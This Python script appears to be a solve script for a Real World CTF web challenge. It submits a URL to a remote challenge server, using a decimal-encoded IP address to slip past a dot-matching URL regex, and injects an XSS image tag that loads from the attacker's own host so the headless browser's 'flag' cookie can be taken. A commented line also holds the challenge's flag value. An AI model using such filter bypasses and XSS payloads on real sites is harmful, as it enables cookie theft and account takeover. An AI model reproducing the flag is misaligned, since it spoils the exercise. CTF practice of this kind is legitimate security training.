import requests as req
import re
from urllib.parse import urlparse

URL = "http://13.57.104.34/Recieve/"


def posturl(u="http://1990445111:7799"):
    print("[+] submit %s" % u)
    data = {
        "url": u
    }
    res = req.post(URL, data)
    if res.status_code == 200:
        print("[+] Result : %s" % res.content)
    else:
        print("[-] error")
        print(res.content)


def get(url):
    res = req.get(url, timeout=2)
    if res.status_code == 200:
        print(res.content)
    if res.status_code == 302:
        print(res.content)
    else:
        print("[-] error")


def rrr(url):
    regex = re.compile(
        r'^(?:http)s?://'  # http:// or https://
        # domain
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'
        r'localhost|'  # localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|'  # ...or ipv4
        r'\[?[A-F0-9]*:[A-F0-9:]+\]?)'  # ...or ipv6
        r'(?::\d+)?'  # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    r = re.match(regex, url)
    if r:
        print("[+] match group : %s" % r.group())
    rr = re.findall(regex, url)
    if rr:
        print("[+] findall : %s" % ''.join(rr))
    res = re.match(regex, url) is not None
    return res


def RunWebDriver(url):
    # phantomjs_path = os.getcwd()+"/phantomjs"
    # browser = webdriver.PhantomJS(executable_path=phantomjs_path) ...
    # browser.add_cookie(
    #     {'name': 'flag', 'value': 'rwctf{L00kI5TheFlo9}', 'path': '/', 'domain': '.127.0.0.1'})
    o = urlparse(url)
    param = o.query
    url = 'http://127.0.0.1/?' + param
    print("param:\n", param)

if __name__ == '__main__':
    # p = "http://1990445111:7799/"
    # p = 'http://%s:%d/xss.php?fuck' % ('1990445111', 7799)
    # p = 'http://1990445111:7799/[]=a'
    p = 'http://1990445111:7799/?v=<img/src=//1990445111:7799/xss.php?fuck>'
    # p = "http://www.v.i.r.z.z.com/"
    print("[+] Payload : %s" % p)
    if rrr(p):
        print("[+] bypass dot")
        posturl(p)
        RunWebDriver(p)
        # print("[!] Local Test")
        # get(p + '?test')
    else:
        print("[-] Error Bypass")
    # p = "http://localhost:7799"
    # posturl(p)
